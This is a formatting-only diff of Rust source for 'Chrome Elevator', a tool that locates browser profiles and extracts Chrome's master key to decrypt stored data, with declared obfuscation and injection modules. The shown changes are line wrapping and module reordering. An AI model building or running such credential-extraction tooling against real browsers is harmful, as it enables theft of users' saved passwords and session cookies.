@@ -1,10 +1,10 @@
 // Chrome Elevator - Rust Edition
 // v0.17.0 - Rust port with cross-platform compilation support
 
-mod obfuscation;
-mod injection;
 mod decryption;
 mod ffi;
+mod injection;
+mod obfuscation;
 
 use anyhow::Result;
 use std::env;
@@ -123,17 +123,27 @@ fn process_browser(browser: &str, config: &Config) -> Result<()> {
         return Ok(());
     }
 
-    println!("[+] {} found at: {}", browser_config.display_name, browser_config.user_data_path.display());
+    println!(
+        "[+] {} found at: {}",
+        browser_config.display_name,
+        browser_config.user_data_path.display()
+    );
 
     if config.verbose {
-        println!("[*] Local State path: {}", browser_config.local_state_path().display());
+        println!(
+            "[*] Local State path: {}",
+            browser_config.local_state_path().display()
+        );
     }
 
     // 获取主密钥
     println!("[*] Extracting master key...");
     let master_key = match AbeDecryptor::get_master_key(&browser_config.local_state_path()) {
         Ok(key) => {
-            println!("[+] Master key extracted successfully ({} bytes)", key.len());
+            println!(
+                "[+] Master key extracted successfully ({} bytes)",
+                key.len()
+            );
             key
         }
         Err(e) => {
@@ -178,7 +188,10 @@ fn process_all_browsers(config: &Config) -> Result<()> {
     for browser_config in browsers {
         println!();
         if let Err(e) = process_browser(&browser_config.name, config) {
-            eprintln!("[!] Failed to process {}: {}", browser_config.display_name, e);
+            eprintln!(
+                "[!] Failed to process {}: {}",
+                browser_config.display_name, e
+            );
             if config.verbose {
                 eprintln!("[!] Error details: {:?}", e);
             }
@@ -243,11 +256,7 @@ mod tests {
     #[test]
     fn test_output_path_handling() {
         // 测试输出路径处理
-        let paths = vec![
-            "./output",
-            "C:\\output",
-            "/tmp/output",
-        ];
+        let paths = vec!["./output", "C:\\output", "/tmp/output"];
 
         for path in paths {
             let p = Path::new(path);
